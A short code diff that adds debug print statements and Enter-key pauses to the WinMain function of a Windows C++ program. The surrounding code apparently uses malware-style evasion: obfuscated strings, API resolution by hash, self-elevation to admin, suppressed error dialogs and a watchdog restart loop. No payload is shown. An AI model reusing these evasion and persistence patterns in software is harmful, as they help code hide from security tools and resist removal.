@@ -131,6 +131,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
 #endif
     printf("[DEBUG] WinMain entered\n");
     fflush(stdout);
+    printf("[DEBUG] Press Enter to continue...\n"); fflush(stdout); getchar();
 
     // Elevate if not already admin
     printf("[DEBUG] Checking elevation flag...\n"); fflush(stdout);
@@ -150,13 +151,22 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     fflush(stdout);
     SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
 
+    printf("[DEBUG] Getting kernel32 handle\n"); fflush(stdout);
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
-    if (!hKernel32) return 0;
+    printf("[DEBUG] kernel32=%p\n", hKernel32); fflush(stdout);
+    if (!hKernel32) { printf("[DEBUG] kernel32 null – exit\n"); fflush(stdout); getchar(); return 0; }
     auto _CreateThread = HASHPROC(hKernel32, CreateThread);
+    printf("[DEBUG] _CreateThread=%p\n", _CreateThread); fflush(stdout);
     auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
+    printf("[DEBUG] _WaitForSingleObject=%p\n", _WaitForSingleObject); fflush(stdout);
     auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
     auto _GetExitCodeThread = HASHPROC(hKernel32, GetExitCodeThread);
-    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) return 0;
+    printf("[DEBUG] _CloseHandle=%p _GetExitCodeThread=%p\n", _CloseHandle, _GetExitCodeThread); fflush(stdout);
+    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
+        printf("[DEBUG] HASHPROC resolution failed – exit. Press Enter...\n"); fflush(stdout);
+        getchar(); return 0;
+    }
+    printf("[DEBUG] All procs resolved – entering watchdog\n"); fflush(stdout);
 
     // Watchdog loop
     DWORD restartCount = 0;
